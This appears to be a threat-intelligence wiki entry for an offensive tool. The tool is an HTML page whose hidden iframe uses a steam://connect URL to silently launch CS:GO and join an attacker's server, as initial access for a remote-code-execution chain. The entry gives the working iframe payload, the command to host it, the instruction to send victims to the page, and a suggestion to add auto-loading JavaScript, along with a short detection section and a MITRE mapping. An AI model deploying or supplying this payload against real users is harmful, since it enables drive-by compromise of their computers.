---
id: tool-html-steam-attack
url: null
tags:
  - drive-by
  - protocol-abuse
  - phishing
type: tool
verified: false
platforms:
  - Windows
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.909Z'
validated: true
submitted: true
---
# HTML-File-for-Steam-Protocol-Attack

**Status**: Unverified

## Overview

Simple HTML file exploiting Steam's browser protocol to automatically connect victims to a malicious CS:GO server via an embedded iframe, enabling drive-by compromise without user confirmation.

## Description

The file uses <iframe src="steam://connect/ip:port"> to invoke Steam's protocol handler, launching CS:GO and joining the server if not running. Served from a phishing site, it automates initial access for the RCE chain.

## Features

- Feature 1: Silent protocol invocation via iframe.
- Feature 2: Auto-launch of CS:GO client.
- Feature 3: No popup or confirmation required.

## Installation

### Requirements

- Web server (e.g., Python http.server)
- Steam installed on victim

### Install Commands

```bash
# No install; edit HTML and host
python -m http.server 80
```

## Basic Usage

Host the HTML and direct victim to URL.

### Common Options

| Option | Description |
|--------|-------------|
| src | steam://connect/IP:PORT |
| style | display:none for hidden iframe |

## Examples

### Example 1: Basic Usage

<html><body><iframe src="steam://connect/192.168.1.100:27015" style="display:none;"></iframe></body></html>

### Example 2: Advanced Usage

Add JavaScript to load iframe on page load for persistence.

## Expected Output

Browser visits page; Steam activates, CS:GO connects to server.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Tactics

- [[Initial Access]] Initial Access

## Detection

Indicators and methods for detecting this tool's usage:

- Suspicious iframes with steam:// URLs in web traffic.
- Unexpected CS:GO launches from browser contexts.

## Related Procedures


## Related Tools

- [[tools/Python-3-Script-for-CSGO-Exploit]]

## References

- Steam protocol documentation
